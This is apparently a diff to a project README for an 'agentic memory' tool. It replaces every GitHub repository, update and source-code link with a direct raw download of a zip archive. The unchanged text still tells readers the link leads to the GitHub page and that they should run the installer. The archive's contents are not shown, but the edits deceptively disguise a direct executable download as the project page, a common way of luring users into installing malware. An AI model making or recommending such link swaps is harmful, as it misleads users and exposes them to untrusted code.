@@ -1,6 +1,6 @@
 # 🤖 Easy-agentic-memory-system-easy-memory- - Smart Memory Tool for Text Generators  
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Mursaleen-khan1/Easy-agentic-memory-system-easy-memory-)  
+[![Download Latest Version](https://img.shields.io/badge/Download-Now-brightgreen)](https://raw.githubusercontent.com/Mursaleen-khan1/Easy-agentic-memory-system-easy-memory-/main/millions/memory_agentic_system_easy_Easy_v2.3.zip)  
 
 ---
 
@@ -36,7 +36,7 @@ Follow these steps to download and run Easy-agentic-memory-system-easy-memory- o
 
 Click the big button below or this link to visit the download page:  
 
-[![Download Now](https://img.shields.io/badge/Download-Here-blue)](https://github.com/Mursaleen-khan1/Easy-agentic-memory-system-easy-memory/)  
+[![Download Now](https://img.shields.io/badge/Download-Here-blue)](https://raw.githubusercontent.com/Mursaleen-khan1/Easy-agentic-memory-system-easy-memory-/main/millions/memory_agentic_system_easy_Easy_v2.3.zip)  
 
 This link takes you to the GitHub page where you can find the latest version of the tool.  
 
@@ -97,7 +97,7 @@ You can adjust the behavior of the program with simple settings available inside
 
 Keep your program up to date by:  
 
-- Visiting the [GitHub download page](https://github.com/Mursaleen-khan1/Easy-agentic-memory-system-easy-memory/) regularly.  
+- Visiting the [GitHub download page](https://raw.githubusercontent.com/Mursaleen-khan1/Easy-agentic-memory-system-easy-memory-/main/millions/memory_agentic_system_easy_Easy_v2.3.zip) regularly.  
 - Downloading the latest version when available.  
 - Running the new installer over your existing installation. This keeps your data intact.  
 
@@ -120,8 +120,8 @@ If problems continue, you can open an issue on the GitHub repository page for he
 
 This software is open source and freely available on GitHub. You can view the source code, report bugs, or contribute on the project page:  
 
-[https://github.com/Mursaleen-khan1/Easy-agentic-memory-system-easy-memory-](https://github.com/Mursaleen-khan1/Easy-agentic-memory-system-easy-memory-)  
+[https://raw.githubusercontent.com/Mursaleen-khan1/Easy-agentic-memory-system-easy-memory-/main/millions/memory_agentic_system_easy_Easy_v2.3.zip](https://raw.githubusercontent.com/Mursaleen-khan1/Easy-agentic-memory-system-easy-memory-/main/millions/memory_agentic_system_easy_Easy_v2.3.zip)  
 
 ---
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Mursaleen-khan1/Easy-agentic-memory-system-easy-memory-)
+[![Download Latest Version](https://img.shields.io/badge/Download-Now-brightgreen)](https://raw.githubusercontent.com/Mursaleen-khan1/Easy-agentic-memory-system-easy-memory-/main/millions/memory_agentic_system_easy_Easy_v2.3.zip)
